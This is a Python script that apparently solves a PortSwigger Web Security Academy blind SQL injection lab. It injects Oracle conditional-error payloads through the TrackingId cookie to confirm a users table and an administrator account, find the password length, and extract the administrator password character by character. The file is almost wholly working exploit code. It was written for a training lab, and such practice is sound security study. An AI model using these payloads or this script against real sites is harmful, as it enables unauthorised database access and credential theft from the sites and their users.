# Web Security Academy Port Swigger
# Blind SQL injection with conditional responses lab
#
import requests
import string
import sys
import argparse
import itertools
from urllib.parse import quote_plus


parser = argparse.ArgumentParser()
parser.add_argument("url", help="URL to vulnerable site")
args = parser.parse_args()


characters = string.ascii_lowercase + string.digits
message = "Internal Server Error"
password_length = 0

sqls = {
    "UserTableCheck":
        "'||(SELECT '' FROM users WHERE ROWNUM = 1)||'",
    "AdminAccountCheck":
        "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users \
                WHERE username='administrator')||'",
    "PasswordLength":
        "'||(SELECT CASE WHEN LENGTH(password)>{0} \
            THEN to_char(1/0) ELSE '' \
            END FROM users WHERE username='administrator')||'",
    "PasswordBrute":
        "'||(SELECT CASE WHEN SUBSTR(password,{0},1)='{1}' \
            THEN TO_CHAR(1/0) ELSE '' \
            END FROM users WHERE username='administrator')||'"
}


def connect(track_id, sql):
    track_id += quote_plus(sql)
    session.cookies.set('TrackingId', track_id, domain='web-security-academy.net')
    res = session.get(args.url)
    return res


def print_status(msg, ch):
    sys.stdout.write('\r')
    sys.stdout.write(msg + ch)
    sys.stdout.flush()


def check_error_condition(text):
    return True if message in text else False


def check_user_table_exists(msg, track_id):
    print(msg, end=' ')
    res = connect(track_id, sqls['UserTableCheck'])
    if check_error_condition(res.text):
        print(False)
    else:
        print(True)


def check_administrator_account(msg, track_id):
    print(msg, end=' ')
    res = connect(track_id, sqls['AdminAccountCheck'])
    print(check_error_condition(res.text))


def check_password_length(msg, track_id):
    global password_length
    progress = itertools.cycle(['/', '-', '\\', '|'])
    while True:
        print_status(msg, next(progress))
        password_length += 1
        res = connect(track_id, sqls['PasswordLength'].format(password_length))
        if check_error_condition(res.text):
            continue
        else:
            break
    print_status(msg, str(password_length) + '\n')


def brute_password(msg, track_id):
    position = 0
    password = ''
    while position < password_length:
        position += 1
        for ch in characters:
            print_status(msg + password, ch)
            res = connect(track_id, sqls['PasswordBrute'].format(position, ch))
            if check_error_condition(res.text):
                password += ch
                break

    print_status(msg, password + '\n')


session = requests.Session()
response = session.get(args.url)
tracking_id = session.cookies.get_dict()['TrackingId']


checks = {'Checking users table:': check_user_table_exists,
          'Checking Administrator account:': check_administrator_account,
          'Checking password length: ': check_password_length,
          'Extracting Admin password: ': brute_password
}

for msg, sqls_run in checks.items():
    sqls_run(msg, tracking_id)
